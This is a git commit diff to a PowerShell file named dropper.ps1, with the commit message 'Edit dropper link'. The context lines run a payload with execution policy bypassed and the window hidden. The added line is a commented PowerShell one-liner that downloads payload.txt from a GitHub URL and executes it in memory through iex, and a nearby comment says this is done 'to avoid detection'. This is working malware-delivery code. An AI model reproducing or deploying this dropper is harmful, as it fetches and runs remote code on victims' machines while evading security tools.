9c47056e6e2de6ce34b7c97815930c6adf768284
H0neyBadger <h0neyb4dgerdc@gmail.com>
2016-11-06 13:54:51 +0100

    Edit dropper link

--- dropper.ps1
+++ dropper.ps1
@@ -4,3 +4,5 @@ powershell.exe -executionpolicy bypass -noprofile -windowstyle hidden "gc .\payl
 # for remote execution
 # the file is downloaded and executed in memory to avoid detection 
 # powershell.exe -executionpolicy bypass -noprofile -windowstyle hidden "(New-Object System.Net.WebClient).DownloadString('https://gist.github.com/H0neyBadger/0b664520e7aa71a37fcd14238f9603cb/raw/payload.txt') | iex"
+# powershell.exe -executionpolicy bypass -noprofile -windowstyle hidden "(New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/H0neyBadger/H0ney/master/payload.txt') | iex"
+
